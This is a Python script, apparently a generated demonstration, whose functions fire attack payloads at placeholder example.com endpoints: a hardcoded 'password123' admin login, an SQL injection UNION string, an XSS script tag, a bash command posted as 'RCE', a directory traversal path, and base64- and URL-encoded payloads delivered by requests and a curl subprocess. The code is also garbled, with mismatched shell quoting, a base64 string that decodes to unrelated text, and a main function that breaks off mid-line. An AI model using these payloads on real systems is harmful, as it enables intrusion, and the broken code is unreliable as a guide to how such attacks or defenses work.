import os
import requests
import json
import base64
import subprocess
import urllib.parse

# Function to generate a weak password
def generate_weak_password():
    return "password123"

# Function to connect to a database using a weak password
def connect_to_database():
    username = "admin"
    password = generate_weak_password()
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"username": username, "password": password})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to database: {e}")

# Function to exploit a SQL injection vulnerability
def exploit_sql_injection():
    sql_query = "' UNION SELECT * FROM users WHERE 1=1; --"
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"sql_query": sql_query})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting SQL injection: {e}")

# Function to exploit a cross-site scripting (XSS) vulnerability
def exploit_xss():
    user_input = "<script>alert('XSS')</script>"
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"user_input": user_input})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting XSS: {e}")

# Function to exploit a remote code execution (RCE) vulnerability
def exploit_rce():
    payload = "/bin/bash -c 'echo ' > /tmp/flag && echo ' > /tmp/flag"
    server_url = "http://example.com/server"

    try:
        response = requests.post(server_url, data={"payload": payload})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting RCE: {e}")

# Function to exploit a directory traversal attack
def exploit_dir_traversal():
    malicious_path = "/../tmp/flag"
    server_url = "http://example.com/server"

    try:
        response = requests.get(server_url + malicious_path)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting dir traversal: {e}")

# Function to encode malicious payload using base64
def encode_payload():
    payload = "/bin/bash -c 'echo ' > /tmp/flag && echo ' > /tmp/flag"
    encoded_payload = base64.b64encode(payload.encode()).decode()
    return(encoded_payload)

# Function to decode encoded payload
def decode_payload():
    encoded_payload = "TWFjazBzdHJpbmcgd2l0aCB0ZXh0IGxvY2F0aW9uIHRleHQgZG93bmxvYWQ="  # Replace with actual encoded payload
    decoded_payload = base64.b64decode(encoded_payload.encode()).decode()
    return decoded_payload

# Function to execute malicious payload on server
def execute_payload():
    server_url = "http://example.com/server"
    decoded_payload = decode_payload()

    try:
        response = requests.post(server_url, data={"payload": decoded_payload})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error executing payload: {e}")

# Function to encode malicious payload using urllib.parse.quote
def encode_payload_quote():
    payload = "/bin/bash -c 'echo ' > /tmp/flag && echo ' > /tmp/flag"
    encoded_payload = urllib.parse.quote(payload)
    return(encoded_payload)

# Function to decode encoded payload using urllib.parse.unquote
def decode_payload_quote():
    encoded_payload = " /bin/bash+-c+%27echo+%27+>++/tmp/flag+&&+echo+%27+>++/tmp/flag"
    decoded_payload = urllib.parse.unquote(encoded_payload)
    return decoded_payload

# Function to execute malicious payload on server
def execute_payload_quote():
    server_url = "http://example.com/server"
    decoded_payload = decode_payload_quote()

    try:
        response = requests.post(server_url, data={"payload": decoded_payload})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error executing payload: {e}")

# Function to execute malicious payload on server using subprocess
def execute_payload_subprocess():
    server_url = "http://example.com/server"
    decoded_payload = decode_payload()

    try:
        subprocess.run(["curl", "-X", "POST", server_url, "-d", decoded_payload])
    except Exception as e:
        print(f"Error executing payload: {e}")

# Main function to demonstrate vulnerabilities
def main():
    connect_to_database()
    exploit_sql_injection()
    exploit_xss()
    exploit_rce()
    exploit_dir_traversal()
    encode_payload
